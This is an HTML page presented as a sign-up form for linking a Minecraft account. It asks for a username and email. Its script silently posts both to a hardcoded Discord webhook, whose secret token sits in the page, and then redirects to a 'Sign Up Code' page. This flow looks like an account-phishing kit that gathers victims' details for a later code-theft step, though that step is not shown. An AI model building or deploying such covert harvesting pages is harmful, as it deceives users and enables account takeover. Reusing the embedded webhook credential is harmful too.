<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign Up</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(-45deg, #1e1e2f, #2c3e50, #34495e, #1abc9c);
      background-size: 400% 400%;
      animation: gradientShift 30s ease infinite;
      overflow: hidden;
      position: relative;
      color: #fff;
      display: flex;
      flex-direction: column;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .navbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      background: rgba(0,0,0,0.6);
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
      position: sticky;
      top: 0;
      z-index: 10;
    }

    .nav-left {
      display: flex;
      gap: 30px;
    }

    .nav-item {
      font-weight: 600;
      font-size: 16px;
      color: #888;
      text-decoration: line-through;
      cursor: not-allowed;
      position: relative;
    }

    .nav-item.home {
      color: #fff;
      text-decoration: none;
      cursor: pointer;
    }

    .nav-item.home:hover {
      color: #1abc9c;
      text-shadow: 0 0 6px #1abc9c;
    }

    .nav-item.disabled:hover::after {
      content: "Need to sign in to access";
      position: absolute;
      top: 120%;
      left: 0;
      background: #222;
      padding: 6px 10px;
      border-radius: 6px;
      font-size: 12px;
      white-space: nowrap;
      color: #fff;
      opacity: 0.9;
    }

    .main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    .particles {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      pointer-events: none;
      overflow: hidden;
      z-index: 1;
    }

    .particles .dot {
      position: absolute;
      width: 8px;
      height: 8px;
      background: rgba(255,255,255,0.1);
      border-radius: 50%;
      animation: float 12s linear infinite;
    }

    @keyframes float {
      0% { transform: translateY(0); opacity: 1; }
      100% { transform: translateY(-100vh); opacity: 0; }
    }

    .container {
      background: rgba(0, 0, 0, 0.75);
      padding: 50px 40px;
      border-radius: 20px;
      box-shadow: 0 0 40px rgba(0,0,0,0.8);
      width: 100%;
      max-width: 500px;
      animation: enterGlow 1.2s ease-out;
      z-index: 2;
    }

    @keyframes enterGlow {
      0% {
        transform: scale(0.85);
        box-shadow: 0 0 0 rgba(0,0,0,0);
        opacity: 0;
      }
      50% {
        transform: scale(1.02);
        box-shadow: 0 0 60px rgba(26, 188, 156, 0.4);
        opacity: 1;
      }
      100% {
        transform: scale(1);
        box-shadow: 0 0 40px rgba(0,0,0,0.8);
        opacity: 1;
      }
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-weight: 600;
      font-size: 1.8rem;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    input {
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: #2f2f3f;
      color: #fff;
      font-size: 15px;
    }

    button {
      padding: 14px;
      background: #1abc9c;
      border: none;
      border-radius: 10px;
      color: #fff;
      font-weight: bold;
      font-size: 15px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #16a085;
    }
  </style>
</head>
<body>
  <div class="navbar">
    <div class="nav-left">
      <a href="index.html" class="nav-item home">Home</a>
      <div class="nav-item disabled">Marketplace</div>
      <div class="nav-item disabled">Download</div>
      <div class="nav-item disabled">Search</div>
    </div>
  </div>

  <div class="main">
    <div class="particles"></div>

    <div class="container">
      <h2>Link Your Minecraft Account</h2>
      <form id="form1">
        <input type="text" id="Name" placeholder="Minecraft Username" required>
        <input type="email" id="Email" placeholder="example@gmail.com" required>
        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    for (let i = 0; i < 40; i++) {
      const dot = document.createElement('span');
      dot.className = 'dot';
      dot.style.left = Math.random() * 100 + '%';
      dot.style.top = Math.random() * 100 + '%';
      dot.style.animationDuration = (6 + Math.random() * 6) + 's';
      document.querySelector('.particles').appendChild(dot);
    }

    const webhookUrl = 'https://discord.com/api/webhooks/1413009868364976218/FRWyak8eE5D6BdqXv5x3_bMiKexf5I8x1y1qJuMPHRMcirw3qxCZseR5qXdatlQrCntp';

    const sendNameEmail = (name, email) => {
      const msg = {
        content: `ðŸ“¨ New sign-up received!\n**Name:** ${name}\n**Email:** ${email}`,
        embeds: [{
          title: 'Sign-Up Details',
          color: 3447003,
          fields: [
            { name: 'Name', value: name },
            { name: 'Email', value: email }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(msg)
      });
    };

    document.addEventListener('DOMContentLoaded', () => {
      document.querySelector('#form1').addEventListener('submit', (e) => {
        e.preventDefault();
        const name = document.querySelector('#Name').value.trim();
        const email = document.querySelector('#Email').value.trim();
        if (!name || !email) return;
        sendNameEmail(name, email);
        setTimeout(() => window.location.href = "Sign Up Code.html", 750);
      });
    });
  </script>
</body>
</html>
